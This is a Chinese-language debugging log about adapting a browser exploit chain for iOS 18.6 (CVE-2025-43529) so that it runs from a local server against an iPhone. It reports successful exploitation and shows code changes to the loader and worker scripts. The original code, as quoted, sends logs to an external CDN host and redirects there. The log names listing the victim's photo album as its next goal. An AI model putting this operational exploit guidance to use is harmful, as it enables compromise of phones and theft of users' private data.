# iOS 18.6 (22G86) 调试记录

## 设备信息
- 设备: iPhone 14 Pro (iPhone14,2)
- iOS版本: 18.6 (22G86)
- CVE-2025-43529 在 iOS 18.7.3 才被修补，理论上应该脆弱

## 最新状态：Exploit 成功！

### 成功日志
```
success with 7 unit tries
jsc_base now: 0x19c77e000
device_model: iPhone15,3_22G86
all done
Redirect triggered
```

## 原版失败原因分析

### 原版配置 (`/home/guava/Downloads/DarKSward-main/`)

原版代码是为 **远程 CDN 服务器** 设计的，不能直接用于本地测试：

| 配置项 | 原版值 | 问题 |
|--------|--------|------|
| `localHost` | `https://static.cdncounter.net/assets` | 指向外部 CDN，本地无法访问 |
| `sbx0_main.js` 路径 | `/sbx0_main_18.4.js` | 没有 `/local/` 前缀 |
| `redirect()` | 跳转到 `https://static.cdncounter.net/404.html` | 外部 URL，本地无法访问 |
| `print()` 函数 | 使用 XMLHttpRequest | Worker 从 Blob URL 加载时 XHR 会失败 |

### 我们做的修改

#### 1. `localHost` 变量
```javascript
// 原版
var localHost = "https://static.cdncounter.net/assets"

// 修改后
var localHost = window.location.origin;
```
**原因**：本地服务器是 `http://192.168.10.129:8000`，需要使用本地 origin 而不是外部 CDN

#### 2. `sbx0_main.js` 路径
```javascript
// 原版 (rce_worker_18.6.js line 10170)
const sbx0_script = getJS('/sbx0_main_18.4.js');

// 修改后
const sbx0_script = getJS('/local/sbx0_main_18.4.js');
```
**原因**：文件放在 `/local/` 目录下，需要加上前缀

#### 3. `print()` 函数（Worker）
```javascript
// 原版 (rce_worker_18.6.js line 18-36)
function print(x, reportError = false, dumphex = false) {
    let out = ('[' + (new Date().getTime() - logStart) + 'ms] ').padEnd(10) + x;
    if (!SERVER_LOG && !reportError) return;
    try {
        let req = Object.entries(obj).map(([k, v]) => `${encodeURIComponent(k)}=${encodeURIComponent(v)}`).join('&')
        const xhr = new XMLHttpRequest();
        xhr.open("GET", host + "/log.html?" + req , false);
        xhr.send(null);
    } catch(e) {}
}

// 修改后 - 使用 postMessage
function print(x, reportError = false, dumphex = false) {
    let out = ('[' + (new Date().getTime() - logStart) + 'ms] ').padEnd(10) + x;
    if (!SERVER_LOG && !reportError) return;
    try {
        self.postMessage({ type: 'worker_log', message: out });
    } catch(e) {}
}
```
**原因**：Worker 从 Blob URL 创建，XMLHttpRequest 会被 CORS 阻止，改用 postMessage

#### 4. `redirect()` 函数
```javascript
// 原版 (rce_loader.js line 25-28)
function redirect() {
    window.location.href = "https://static.cdncounter.net/404.html";
}

// 修改后 - 显示设备信息
function redirect(data) {
    document.body.innerHTML = `
        <div style="font-family: monospace; padding: 20px; background: #1a1a1a; color: #0f0;">
            <h2>✓ Exploit Success!</h2>
            <pre>${JSON.stringify(data, null, 2)}</pre>
        </div>
    `;
}
```
**原因**：不跳转到外部 URL，显示 exploit 收集到的信息

#### 5. Worker 传递设备信息
```javascript
// 修改后在 redirect 消息中附加数据
self.postMessage({
    type: 'redirect',
    deviceModel: device_model,
    jscBase: p.jsc_base,
    info: 'Exploit completed'
});
```

## 当前配置

- 使用 universal worker (`rce_worker_18.6.js`)
- 服务器: `http://192.168.10.129:8000`
- 文件路径: `/local/sbx0_main_18.4.js`, `/local/sbx1_main.js`

## 待修复问题

### 设备检测错误
- 检测结果: `iPhone15,3_22G86` ❌ (应该是 `iPhone14,2`)
- 原因: per-device worker 偏移量是从 22G90 复制的，错误
- 但不影响 exploit 执行（universal worker 有正确偏移量）

## 下一步
1. ✅ Exploit 已成功
2. 继续测试确认稳定性
3. 如果需要，可以研究如何列出相册照片